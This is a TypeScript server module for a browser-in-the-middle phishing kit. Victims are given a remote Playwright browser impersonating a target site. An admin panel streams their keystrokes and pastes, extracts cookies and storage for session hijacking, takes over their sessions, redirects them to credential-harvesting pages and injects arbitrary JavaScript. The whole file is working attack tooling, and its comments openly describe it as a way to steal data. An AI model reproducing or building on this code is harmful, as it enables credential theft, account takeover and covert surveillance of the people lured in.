import type { Server } from 'socket.io';
import type {
  AppSocket,
  ClientToServerEvents,
  ServerToClientEvents,
  SocketData,
  VictimInfo,
  Target,
} from './types.js';
import {
  claimInstance,
  getInstanceById,
  getInstanceBySocket,
  getAllInstances,
  closeBrowser,
} from './browser-manager.js';
import {
  handleMouseMove,
  handleMouseClick,
  handleMouseScroll,
  handleKeyDown,
  handleKeyUp,
  handlePaste,
} from './input-handler.js';
import { extractCookies, extractStorage } from './session-extractor.js';
import { logEvent } from './session-logger.js';
import {
  getSystemMetrics,
  getVictimMetrics,
  recordKeystroke,
  clearVictimMetrics,
  incrementSessionCount,
} from './metrics.js';
import { MAX_CONCURRENT_VICTIMS } from './browser-manager.js';

/**
 * Type alias for Socket.IO server with full type safety.
 */
type IoServer = Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>;

// ═══════════════════════════════════════════════════════════════════════════════
// Main Registration Function
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Registers all Socket.IO event handlers for the application.
 * 
 * **Connection Flow:**
 * 1. Client connects (victim or admin)
 * 2. Authentication middleware runs (see server.ts)
 * 3. socket.data.isAdmin is set based on auth result
 * 4. This function routes to appropriate handler (admin or victim)
 * 5. Disconnect handler is registered for cleanup
 * 
 * @param io - Socket.IO server instance
 * @param targets - Target site configurations from targets.json
 */
export function registerSocketHandlers(io: IoServer, targets: Record<string, Target>): void {
  io.on('connection', (socket: AppSocket) => {
    console.log(`[socket] Connected: ${socket.id} admin=${socket.data.isAdmin}`);

    if (socket.data.isAdmin) {
      handleAdminConnect(io, socket, targets);
    } else {
      handleVictimConnect(io, socket, targets);
    }

    socket.on('disconnect', () => handleDisconnect(io, socket));
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// Admin Connection Handler
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Handles admin client connections and registers admin-specific event handlers.
 * 
 * **Admin Capabilities:**
 * - View list of active victims
 * - Receive real-time thumbnails from all victims
 * - Take over victim browsers (receive frames, send input)
 * - Extract cookies and storage
 * - Navigate victim browsers
 * - Inject JavaScript into victim pages
 * - View system and per-victim metrics
 * 
 * @param io - Socket.IO server instance
 * @param socket - Admin's socket connection
 * @param targets - Target site configurations (unused but kept for future features)
 */
function handleAdminConnect(
  io: IoServer,
  socket: AppSocket,
  _targets: Record<string, Target>,
): void {
  // Join 'admin' room for broadcast messages (thumbnails, new victims, etc.)
  void socket.join('admin');

  // ─── Metrics Emission ───────────────────────────────────────────────────────

  /**
   * Start metrics emission interval (every 2 seconds).
   * Sends system-wide metrics and per-victim metrics to admin.
   */
  const metricsInterval = setInterval(() => {
    const instances = getAllInstances();
    
    // Emit system-wide metrics (uptime, memory, CPU, etc.)
    const systemMetrics = getSystemMetrics(instances, MAX_CONCURRENT_VICTIMS);
    socket.emit('system_metrics', systemMetrics);
    
    // Emit per-victim metrics (FPS, latency, keystrokes, etc.)
    instances
      .filter(i => i.claimed && i.victimSocket !== null)
      .forEach(instance => {
        const victimMetrics = getVictimMetrics(instance);
        socket.emit('victim_metrics', victimMetrics);
      });
  }, 2000);

  // Clear interval on disconnect to prevent memory leaks
  socket.on('disconnect', () => {
    clearInterval(metricsInterval);
  });

  // ─── Initial Victim List ────────────────────────────────────────────────────

  /**
   * Send current list of active victims to newly connected admin.
   * This populates the admin UI with existing sessions.
   */
  const victims: VictimInfo[] = getAllInstances()
    .filter((i) => i.claimed && i.victimSocket !== null)
    .map((i) => ({
      browserId: i.id,
      target: i.target?.name ?? 'unknown',
      connectedAt: i.connectedAt?.toISOString() ?? '',
      ip: '', // IP is logged but not sent to admin UI (privacy consideration)
      keylog: i.keylog,
      status: 'active' as const,
    }));
  socket.emit('victim_list', victims);

  // ─── Admin Input Events ─────────────────────────────────────────────────────

  /**
   * Admin mouse move handler.
   * Only processes input if admin has taken over a browser.
   * Admin coordinates are already in Playwright viewport space (no scaling needed).
   */
  socket.on('mouse_move', async (data) => {
    const instance = socket.data.browserId ? getInstanceById(socket.data.browserId) : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    // Admin coords are already in Playwright viewport space — skip victim scaling
    try { await instance.page.mouse.move(data.x, data.y); } catch {}
  });

  /**
   * Admin mouse click handler.
   * Only processes input if admin has taken over a browser.
   */
  socket.on('mouse_click', async (data) => {
    const instance = socket.data.browserId ? getInstanceById(socket.data.browserId) : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    try { await instance.page.mouse.click(data.x, data.y, { button: data.button }); } catch {}
  });

  /**
   * Admin mouse scroll handler.
   * Only processes input if admin has taken over a browser.
   */
  socket.on('mouse_scroll', async (data) => {
    const instance = socket.data.browserId ? getInstanceById(socket.data.browserId) : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    try { await instance.page.mouse.wheel(data.deltaX, data.deltaY); } catch {}
  });

  /**
   * Admin key down handler.
   * Only processes input if admin has taken over a browser.
   */
  socket.on('key_down', async (data) => {
    const instance = socket.data.browserId
      ? getInstanceById(socket.data.browserId)
      : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    await handleKeyDown(instance, data);
  });

  /**
   * Admin key up handler.
   * Only processes input if admin has taken over a browser.
   */
  socket.on('key_up', async (data) => {
    const instance = socket.data.browserId
      ? getInstanceById(socket.data.browserId)
      : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    await handleKeyUp(instance, data);
  });

  /**
   * Admin paste handler.
   * Only processes input if admin has taken over a browser.
   */
  socket.on('paste', async (data) => {
    const instance = socket.data.browserId
      ? getInstanceById(socket.data.browserId)
      : undefined;
    if (!instance || instance.controllerSocket !== socket.id) return;
    await handlePaste(instance, data);
  });

  // ─── Admin Commands ─────────────────────────────────────────────────────────

  /**
   * Take over a victim's browser.
   * 
   * **Takeover Process:**
   * 1. Verify victim exists and is active
   * 2. Set admin as controller
   * 3. Reroute frames to BOTH victim and admin
   * 4. Notify victim they've been taken over
   * 5. Log takeover event
   * 
   * **During Takeover:**
   * - Victim still sees frames but input is blocked
   * - Admin receives frames and can send input
   * - Both see the same browser state in real-time
   */
  socket.on('take_over_browser', (data) => {
    const instance = getInstanceById(data.browserId);
    if (!instance || !instance.victimSocket) {
      socket.emit('error', 'No active victim for that browser ID');
      return;
    }

    // Set admin as controller
    instance.controllerSocket = socket.id;
    socket.data.browserId = data.browserId;

    // Reroute frames to BOTH victim and admin
    const victimSocket = instance.victimSocket;
    instance.onFrame = (buf: Buffer) => {
      io.to(victimSocket).emit('frame', buf);
      socket.emit('frame', buf);
    };

    // Notify victim of takeover
    io.to(victimSocket).emit('taken_over');
    console.log(`[socket] Admin ${socket.id} took over browser ${data.browserId}`);
    void logEvent({ event: 'takeover_start', browserId: data.browserId });
  });

  /**
   * Return control to victim.
   * 
   * **Return Process:**
   * 1. Clear admin as controller
   * 2. Restore frame routing to victim only
   * 3. Notify victim control has been returned
   * 4. Log takeover end event
   */
  socket.on('give_back_control', () => {
    const browserId = socket.data.browserId;
    if (!browserId) return;

    const instance = getInstanceById(browserId);
    if (!instance) return;

    const victimSocket = instance.victimSocket;
    instance.controllerSocket = null;
    socket.data.browserId = undefined;

    if (victimSocket) {
      // Restore frame routing to victim only
      instance.onFrame = (buf: Buffer) => {
        io.to(victimSocket).emit('frame', buf);
      };
      io.to(victimSocket).emit('control_returned');
    }

    console.log(`[socket] Admin ${socket.id} returned control of ${browserId}`);
    void logEvent({ event: 'takeover_end', browserId });
  });

  /**
   * Extract cookies from victim's browser.
   * 
   * Uses CDP to extract all cookies from the browser context.
   * Sends cookies back to admin for session hijacking.
   */
  socket.on('get_cookies', async ({ browserId }) => {
    const instance = getInstanceById(browserId);
    if (!instance) {
      socket.emit('error', 'Browser not found');
      return;
    }
    try {
      const payload = await extractCookies(instance);
      socket.emit('cookies', payload);
      void logEvent({ event: 'cookies_extracted', browserId, cookieCount: payload.cookies.length });
    } catch (err) {
      socket.emit('error', `Cookie extraction failed: ${(err as Error).message}`);
    }
  });

  /**
   * Extract localStorage and sessionStorage from victim's browser.
   * 
   * Injects JavaScript to read storage from the current page.
   * Sends storage data back to admin.
   */
  socket.on('get_storage', async ({ browserId }) => {
    const instance = getInstanceById(browserId);
    if (!instance) {
      socket.emit('error', 'Browser not found');
      return;
    }
    try {
      const payload = await extractStorage(instance);
      socket.emit('storage', payload);
      void logEvent({ event: 'storage_extracted', browserId });
    } catch (err) {
      socket.emit('error', `Storage extraction failed: ${(err as Error).message}`);
    }
  });

  /**
   * Navigate victim's browser to a specific URL.
   * 
   * Only works if admin has taken over the browser.
   * Useful for redirecting victim to credential harvesting pages.
   */
  socket.on('navigate', async (data) => {
    const browserId = socket.data.browserId;
    if (!browserId) return;

    const instance = getInstanceById(browserId);
    if (!instance) return;

    try {
      await instance.page.goto(data.url, { waitUntil: 'domcontentloaded' });
    } catch (err) {
      socket.emit('error', `Navigation failed: ${(err as Error).message}`);
    }
  });

  /**
   * Inject and execute JavaScript in victim's page.
   * 
   * Only works if admin has taken over the browser.
   * Useful for:
   * - Modifying page content
   * - Stealing additional data
   * - Bypassing client-side security
   * - Triggering specific actions
   */
  socket.on('inject_js', async (data) => {
    const browserId = socket.data.browserId;
    if (!browserId) return;

    const instance = getInstanceById(browserId);
    if (!instance) return;

    try {
      await instance.page.evaluate(data.js);
      void logEvent({ event: 'js_injected', browserId: instance.id, script: data.js });
    } catch (err) {
      socket.emit('error', `JS injection failed: ${(err as Error).message}`);
    }
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// Victim Connection Handler
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Handles victim client connections and registers victim-specific event handlers.
 * 
 * **Victim Flow:**
 * 1. Connect to server
 * 2. Send 'new_phish' event with viewport size and target
 * 3. Receive browser session (frames start flowing)
 * 4. Send input events (mouse, keyboard)
 * 5. Receive page metadata (title, favicon)
 * 6. Disconnect when done
 * 
 * @param io - Socket.IO server instance
 * @param socket - Victim's socket connection
 * @param targets - Target site configurations
 */
function handleVictimConnect(
  io: IoServer,
  socket: AppSocket,
  targets: Record<string, Target>,
): void {
  /**
   * Handle new victim session request.
   * 
   * **Process:**
   * 1. Validate target exists
   * 2. Claim a browser instance (warm or cold)
   * 3. Configure frame routing to victim
   * 4. Set up navigation logging
   * 5. Set up page metadata emission
   * 6. Notify all admins of new victim
   */
  socket.on('new_phish', async (data) => {
    const target = targets[data.target];
    if (!target) {
      socket.emit('error', `Unknown target: ${data.target}`);
      return;
    }

    console.log(`[socket] new_phish from ${socket.id} — target: ${data.target}`);

    try {
      // Claim a browser instance for this victim
      const instance = await claimInstance(
        socket.id,
        data.width,
        data.height,
        target,
      );

      // Wire frame routing to victim
      instance.onFrame = (buf: Buffer) => {
        socket.emit('frame', buf);
      };

      socket.data.browserId = instance.id;

      // Increment daily session counter
      incrementSessionCount();

      // Log session start event
      void logEvent({
        event: 'session_start',
        browserId: instance.id,
        ip: socket.handshake.address,
        userAgent: (socket.handshake.headers['user-agent'] as string | undefined) ?? '',
        target: target.name,
        viewport: { w: data.width, h: data.height },
      });

      /**
       * Log every top-level navigation URL.
       * Helps track victim's journey through the phishing site.
       */
      instance.navigationLogger = (frame) => {
        if (frame.parentFrame() !== null) return; // Only log main frame
        void logEvent({ event: 'navigation', browserId: instance.id, url: frame.url() });
      };
      instance.page.on('framenavigated', instance.navigationLogger);

      /**
       * Emit page title + favicon to victim after each navigation.
       * This updates the victim's browser tab to match the target site.
       */
      const emitPageMeta = async () => {
        try {
          await instance.page.waitForLoadState('domcontentloaded');
          const title = await instance.page.title();
          const favicon: string = await instance.page.evaluate(() => {
            // Try to find favicon link element
            for (const sel of ['link[rel="shortcut icon"]', 'link[rel~="icon"]']) {
              const el = document.querySelector(sel) as HTMLLinkElement | null;
              if (el?.href) return el.href;
            }
            // Fallback to /favicon.ico
            return new URL('/favicon.ico', location.href).href;
          });
          socket.emit('page_meta', { title, favicon });
        } catch { /* page may have closed */ }
      };

      // Emit page metadata after each navigation
      instance.pageMetaEmitter = (frame) => {
        if (frame.parentFrame() !== null) return; // Only for main frame
        void emitPageMeta();
      };
      instance.page.on('framenavigated', instance.pageMetaEmitter);

      // Emit initial page metadata
      void emitPageMeta();

      // Notify all admins of new victim
      const victimInfo: VictimInfo = {
        browserId: instance.id,
        target: target.name,
        connectedAt: instance.connectedAt?.toISOString() ?? '',
        ip: socket.handshake.address,
        keylog: '',
        status: 'active',
      };
      io.to('admin').emit('new_victim', victimInfo);
    } catch (err) {
      console.error(`[socket] Failed to claim instance: ${(err as Error).message}`);
      socket.emit('error', 'Failed to start browser session');
    }
  });

  // ─── Victim Input Events ────────────────────────────────────────────────────

  /**
   * Victim mouse move handler.
   * Blocked when admin has taken over (controllerSocket is set).
   */
  socket.on('mouse_move', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return; // blocked during takeover
    await handleMouseMove(instance, data);
  });

  /**
   * Victim mouse click handler.
   * Blocked when admin has taken over.
   */
  socket.on('mouse_click', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleMouseClick(instance, data);
  });

  /**
   * Victim mouse scroll handler.
   * Blocked when admin has taken over.
   */
  socket.on('mouse_scroll', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleMouseScroll(instance, data);
  });

  /**
   * Victim key down handler.
   * Blocked when admin has taken over.
   * 
   * Also handles keystroke logging:
   * - Formats the key for logging
   * - Appends to instance keylog
   * - Records keystroke metric
   * - Broadcasts to all admins in real-time
   * - Logs to session log file
   */
  socket.on('key_down', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleKeyDown(instance, data);
    
    // Keystroke logging
    const entry = formatKey(data.key);
    if (entry) {
      instance.keylog += entry;
      recordKeystroke(instance.id);
      io.to('admin').emit('keylog', { browserId: instance.id, entry });
      void logEvent({ event: 'keylog', browserId: instance.id, entry });
    }
  });

  /**
   * Victim key up handler.
   * Blocked when admin has taken over.
   */
  socket.on('key_up', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handleKeyUp(instance, data);
  });

  /**
   * Victim paste handler.
   * Blocked when admin has taken over.
   * 
   * Also handles paste logging:
   * - Formats paste event for logging
   * - Appends to instance keylog
   * - Broadcasts to all admins in real-time
   * - Logs to session log file
   */
  socket.on('paste', async (data) => {
    const instance = getInstanceBySocket(socket.id);
    if (!instance || instance.controllerSocket) return;
    await handlePaste(instance, data);
    
    // Paste logging
    const entry = `[PASTE:${data.text}]`;
    instance.keylog += entry;
    io.to('admin').emit('keylog', { browserId: instance.id, entry });
    void logEvent({ event: 'paste', browserId: instance.id, text: data.text });
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// Keystroke Formatting
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Set of modifier and special keys to skip in keystroke logging.
 * These keys don't produce visible output and clutter the keylog.
 */
const SKIP_KEYS = new Set(['Meta', 'Control', 'Alt', 'Shift', 'CapsLock', 'Dead']);

/**
 * Formats a key for keystroke logging.
 * 
 * **Formatting Rules:**
 * - Modifier keys (Ctrl, Alt, etc.): Skip (return null)
 * - Printable characters (a-z, 0-9, etc.): Return as-is
 * - Special keys (Enter, Backspace, etc.): Wrap in brackets [Enter]
 * 
 * @param key - Key value from KeyboardEvent.key
 * @returns Formatted key string or null if key should be skipped
 */
function formatKey(key: string): string | null {
  if (SKIP_KEYS.has(key)) return null;
  if (key.length === 1) return key;       // printable char
  return `[${key}]`;                      // Enter, Backspace, Tab, ArrowLeft, etc.
}

// ═══════════════════════════════════════════════════════════════════════════════
// Disconnect Handler
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Handles socket disconnections for both admin and victim clients.
 * 
 * **Admin Disconnect:**
 * - If admin was controlling a browser, return control to victim
 * - Restore frame routing to victim only
 * - Log takeover end event
 * 
 * **Victim Disconnect:**
 * - Calculate session duration
 * - Log session end event
 * - Notify all admins
 * - Clear victim metrics
 * - Close browser instance (cleanup resources)
 * 
 * @param io - Socket.IO server instance
 * @param socket - Disconnected socket
 */
async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> {
  console.log(`[socket] Disconnected: ${socket.id}`);

  if (socket.data.isAdmin) {
    // Admin disconnect: return control if they were controlling a browser
    const browserId = socket.data.browserId;
    if (browserId) {
      const instance = getInstanceById(browserId);
      if (instance) {
        instance.controllerSocket = null;
        void logEvent({ event: 'takeover_end', browserId });
        const victimSocket = instance.victimSocket;
        if (victimSocket) {
          // Restore frame routing to victim only
          instance.onFrame = (buf: Buffer) => {
            io.to(victimSocket).emit('frame', buf);
          };
          io.to(victimSocket).emit('control_returned');
        }
      }
    }
    return;
  }

  // Victim disconnect: cleanup browser and notify admins
  const browserId = socket.data.browserId;
  if (browserId) {
    const instance = getInstanceById(browserId);
    
    // Remove event listeners before closing browser
    if (instance) {
      if (instance.navigationLogger) {
        instance.page.off('framenavigated', instance.navigationLogger);
        instance.navigationLogger = null;
      }
      if (instance.pageMetaEmitter) {
        instance.page.off('framenavigated', instance.pageMetaEmitter);
        instance.pageMetaEmitter = null;
      }
    }
    
    const durationMs = instance?.connectedAt
      ? Date.now() - instance.connectedAt.getTime()
      : 0;
    void logEvent({ event: 'session_end', browserId, durationMs });
    
    // Notify admins of status change (keep session visible but mark as disconnected)
    io.to('admin').emit('victim_disconnected', { 
      browserId,
      status: 'disconnected',
      keylog: instance?.keylog ?? '',
    });
    
    clearVictimMetrics(browserId);
    await closeBrowser(browserId);
  }
}